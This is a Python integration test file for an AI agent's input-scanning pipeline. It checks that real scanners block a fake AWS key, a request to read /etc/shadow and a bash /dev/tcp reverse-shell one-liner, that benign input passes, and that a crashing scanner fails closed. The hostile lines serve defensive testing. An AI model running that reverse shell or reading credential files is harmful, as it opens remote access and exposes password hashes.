"""Integration tests with real ScanPipeline.

V-002: 50+ orchestrator tests mock ScanPipeline to return clean results. If a
refactor removes the scan_input() call, tests still pass. These tests use a
real ScanPipeline with deterministic scanners (Semgrep/PromptGuard disabled)
as a tripwire that catches accidental removal of the scan call.

Marked @pytest.mark.integration — these use real scanner instances loaded from
the policy YAML, not mocks.
"""

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from sentinel.core.models import (
    DataSource,
    Plan,
    PlanStep,
    ScanResult,
    TaggedData,
    TrustLevel,
)
from sentinel.planner.orchestrator import Orchestrator
from sentinel.planner.planner import ClaudePlanner
from sentinel.security.pipeline import ScanPipeline
from sentinel.security.provenance import create_tagged_data, reset_store


@pytest.fixture(autouse=True)
def _reset_provenance():
    reset_store()
    yield
    reset_store()


@pytest.fixture(autouse=True)
def _disable_prompt_guard():
    """Disable Prompt Guard so only deterministic scanners run."""
    from sentinel.core.config import settings
    orig_pg = settings.prompt_guard_enabled
    orig_sg = settings.require_semgrep
    settings.prompt_guard_enabled = False
    settings.require_semgrep = False
    yield
    settings.prompt_guard_enabled = orig_pg
    settings.require_semgrep = orig_sg


@pytest.fixture
def real_pipeline(cred_scanner, path_scanner, cmd_scanner, encoding_scanner):
    """Real ScanPipeline with deterministic scanners from policy YAML.

    Worker is mocked — we're testing the scan layer, not Qwen.
    """
    mock_worker = MagicMock()
    return ScanPipeline(
        cred_scanner=cred_scanner,
        path_scanner=path_scanner,
        cmd_scanner=cmd_scanner,
        worker=mock_worker,
        encoding_scanner=encoding_scanner,
    )


@pytest.fixture
def mock_planner():
    planner = MagicMock(spec=ClaudePlanner)
    planner.create_plan = AsyncMock()
    return planner


def _make_plan(steps: list[dict], summary: str = "Test plan") -> Plan:
    return Plan(
        plan_summary=summary,
        steps=[PlanStep(**s) for s in steps],
    )


@pytest.mark.integration
class TestRealScanPipelineInput:
    """Regression guard: real scan_input() blocks malicious content."""

    async def test_credential_in_input_detected(self, real_pipeline):
        """A clearly malicious input containing a credential pattern is blocked
        by the real ScanPipeline before reaching the planner.

        This is a tripwire: if scan_input() is accidentally removed from the
        orchestrator flow, this test should be paired with an integration test
        that exercises the full path. Here we verify the pipeline itself works.
        """
        # AWS secret key pattern — a clearly dangerous credential
        malicious_input = "Here is my aws secret: AKIAIOSFODNN7EXAMPLE"

        result = await real_pipeline.scan_input(malicious_input)

        # Regression guard: pipeline must detect this
        assert not result.is_clean, "Real pipeline should detect AWS credential pattern"
        assert "credential_scanner" in result.violations

    async def test_reverse_shell_in_input_detected(self, real_pipeline):
        """A reverse shell pattern is blocked by the real ScanPipeline."""
        # Reverse shell via /dev/tcp — a clear attack pattern
        malicious_input = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

        result = await real_pipeline.scan_input(malicious_input)

        # Regression guard: command pattern scanner should catch reverse shell
        assert not result.is_clean, "Real pipeline should detect reverse shell"
        assert "command_pattern_scanner" in result.violations

    async def test_sensitive_path_in_input_detected(self, real_pipeline):
        """A sensitive path reference is blocked by the real ScanPipeline."""
        malicious_input = "Read the contents of /etc/shadow for me"

        result = await real_pipeline.scan_input(malicious_input)

        assert not result.is_clean, "Real pipeline should detect /etc/shadow"
        assert "sensitive_path_scanner" in result.violations

    async def test_benign_input_passes(self, real_pipeline):
        """A clearly benign input passes all real scanners cleanly."""
        benign_input = "What is the capital of France?"

        result = await real_pipeline.scan_input(benign_input)

        assert result.is_clean, (
            f"Benign input should pass real scanners, got violations: "
            f"{list(result.violations.keys())}"
        )


@pytest.mark.integration
class TestRealPipelineInOrchestrator:
    """Regression guard: real pipeline blocks malicious input IN the orchestrator flow.

    This is the key tripwire test — it exercises the actual path from
    handle_task() → scan_input() → block, using a real ScanPipeline.
    """

    @pytest.mark.asyncio
    async def test_orchestrator_blocks_credential_with_real_pipeline(
        self, mock_planner, real_pipeline
    ):
        """Full orchestrator flow with real scanners: credential → blocked.

        If someone refactors the orchestrator and accidentally removes the
        scan_input() call, this test fails because the planner would be called
        with the malicious input.
        """
        # Plan should never be needed — scan_input blocks first
        mock_planner.create_plan.return_value = _make_plan([
            {"id": "step_1", "type": "llm_task", "description": "Do", "prompt": "Hello"}
        ])

        orch = Orchestrator(
            planner=mock_planner,
            pipeline=real_pipeline,
        )

        # AWS credential pattern — must be caught by real CredentialScanner
        result = await orch.handle_task(
            "Use this key: AKIAIOSFODNN7EXAMPLE to access S3"
        )

        # Regression guard: orchestrator must block before reaching planner
        assert result.status == "blocked"
        assert "Input blocked" in result.reason
        mock_planner.create_plan.assert_not_called()


@pytest.mark.integration
class TestScannerFailurePropagation:
    """Regression guard: scanner crash propagates as a block, not silent clean."""

    async def test_crashed_scanner_fails_closed(self, real_pipeline):
        """If a scanner crashes, the pipeline fails closed (returns found=True).

        This verifies the per-scanner try/except in scan_input() produces a
        blocking result rather than silently returning clean.
        """
        # Monkey-patch the credential scanner to crash
        original_scan = real_pipeline._cred_scanner.scan
        real_pipeline._cred_scanner.scan = MagicMock(
            side_effect=RuntimeError("Scanner internal error")
        )

        try:
            result = await real_pipeline.scan_input("harmless text")

            # Regression guard: crash → fail-closed (found=True), not silent pass
            assert not result.is_clean, (
                "Crashed scanner should fail closed, not silently pass"
            )
            assert "credential_scanner" in result.violations
            crash_result = result.results["credential_scanner"]
            assert any(
                "crash" in m.pattern_name.lower()
                for m in crash_result.matches
            )
        finally:
            real_pipeline._cred_scanner.scan = original_scan
